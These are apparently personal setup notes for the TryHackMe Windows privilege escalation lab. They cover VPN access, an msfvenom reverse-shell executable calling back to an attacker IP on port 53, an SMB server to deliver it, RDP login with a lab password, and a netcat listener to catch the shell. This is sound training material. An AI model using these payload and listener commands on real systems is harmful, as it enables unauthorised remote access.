0x2 Initial Setup

**DISCLAIMER**
**Do not try this in office systems, This conntents are shared for learning purpose only**

----

# TryHackMe

1. Login to Tryhackme portal - https://tryhackme.com/signup
2. Go to Access - https://tryhackme.com/access
3. Download my configuration file (ovpn)
4. Connect to Tryhackme network using openvpn and your ovpn file
5. Go to Win Priv Room and click on Join room - https://tryhackme.com/room/windows10privesc
6. Deploy Machine and notedown the IP of target box
7. ping the target and take the rdp of server as mentioned in notes


# Create reverse.exe using msfvenom
```console
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.4.127 LPORT=53 -f exe -o reverse.exe
```

# Setup SMB Server in Kali
```console
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```

# RDP
```console
rdesktop -u user -ppassword321 10.10.185.15
```

# Upload files
```console
copy \\10.9.4.127\kali\reverse.exe C:\PrivEsc\reverse.exe
```

# Setup netcat listener for local shell
```console
rlwrap nc -nvlp 53
```

# WinPEAS
[WinPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

![a12bff6267f46faff08bff59592b1249.png](../_resources/ae960fcae77b466fae8beafab9a95fcf.png)
